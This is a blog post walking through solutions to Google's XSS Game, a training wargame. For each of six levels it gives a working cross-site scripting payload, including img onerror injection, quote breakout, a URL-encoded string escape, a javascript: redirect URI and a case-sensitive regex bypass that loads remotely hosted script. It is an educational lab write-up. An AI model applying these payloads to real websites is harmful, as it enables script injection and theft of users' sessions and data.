+++
title = "Googles XSS Game - Solutions"
date = "2014-06-02"
tags = ["web", "wargames", "security", "coding", "hacking", "xss", "google", "javascript"]
category = "blog"
+++

These are my steps how I've solved the [XSS Game](https://xss-game.appspot.com/)

## Level 1

This is the most obvious and easiest one. Just insert following code and you're done:

~~~ javascript
<script>alert(1)</script>
~~~

## Level 2

Since the `script` won't work you'll have to think of another tags to trigger JavaScript code execution. The first thing which came in mind was to use `img` tags along with the `onerror` attributes. Here you go:

~~~ javascript
<img src="http://inexist.ent" onerror="javascript:alert(1)"/>
~~~

<!--more-->

## Level 3

Well this time I had to read some code in order to understand the applications logic. If you toggle the code you'll see `index.html`:

~~~ javascript
[...]
      function chooseTab(num) {
        // Dynamically load the appropriate image.
        var html = "Image " + parseInt(num) + "<br>";
        html += "<img src='/static/level3/cloud" + num + ".jpg' />";
        $('#tabContent').html(html);
[...]
~~~

As you see the `num` parameter is used to generate the `img` tag. The ideas was to break-out the quotes and insert some sneaky javascript code. Again I've used the `onerror` attribute to insert JS. Insert this into the URL address bar and you'll get your `alert()`:

~~~
https://xss-game.appspot.com/level3/frame#3' onerror='alert(1)';
~~~

## Level 4

This is quite tricky. This time I have followed the provided hints. Having the JS console activated and requesting `https://xss-game.appspot.com/level4/frame?timer='` showed me following output:

~~~ javascript
SyntaxError: unterminated string literal

startTimer(''');
~~~

Obviously there is again a way to escape the function and append the `alert()` call. I have tried several things:

* https://xss-game.appspot.com/level4/frame?timer=');

~~~ javascript
    SyntaxError: unterminated string literal

    startTimer('')');
~~~


* https://xss-game.appspot.com/level4/frame?timer=')&#59;

~~~ javascript
    SyntaxError: unterminated string literal


    startTimer('')');
~~~


And then I've decided to use some URL encoding: `%3B` represents the semi-colon.

* https://xss-game.appspot.com/level4/frame?timer=')%3B

~~~ javascript
    SyntaxError: unterminated string literal


    startTimer('');');
~~~


Aha.. There you go! We can terminate the call and insert other ones. The **final request**:

* https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar b=('

which resulted in

~~~
startTimer('');alert(1);var b=('');
~~~

I must admit: Nice one!


## Level 5

This one was quite easy. On the first page you can see a link: `https://xss-game.appspot.com/level5/frame/signup?next=confirm`. Now let's have a look how this `next` parameter is used in `confirm.html`:

~~~ javascript
[...]
<script>
      setTimeout(function() { window.location = '{{ next }}'; }, 5000);
</script>
[...]
~~~

So the window.location is set based on the `next` parameter. This is a typical case for *DOM based XSS*.  Besides that we have in `signup.html`:

~~~ javascript
[...]
<br><br>
    <a href="{{ next }}">Next >></a>
</body>
[...]
~~~

Again the `next` parameter is used as an `a` tag target. Ok, enough bla bla. Here is the PoC:

* Go to `https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)`
* Insert your Mail
* Click `Next >>`
* Voila!

## Level 6

This time I had to figure to host my JS code. So I've used `pastebin.com` to host my [evil code](http://pastebin.com/raw.php?i=rTRPYeNk). Next I had a look at the code. As you can read a new `script` tag is created and the `src` attribute is set appropriately. The only catch about it: You're not allowed to have a URL containing *https?*:

~~~ javascript
[...]
      if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById("log"),
          "Sorry, cannot load a URL containing \"http\".");
        return;
      }
[...]
~~~

Afterwards the text after the hash is used as the scripts src:

~~~ javascript
// Load this awesome gadget
scriptEl.src = url;
~~~

Have you noticed something about the regexp? No?! Seriously not? Ok. It's **not** case-sensitive. You can escape it by using *hTTps* or any other combination. So the **final PoC**:

* https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0


## Conclusion

This was a great game to play with. After all I must say the levels were not that difficult but a really good opportunity to refresh my XSS skills :)
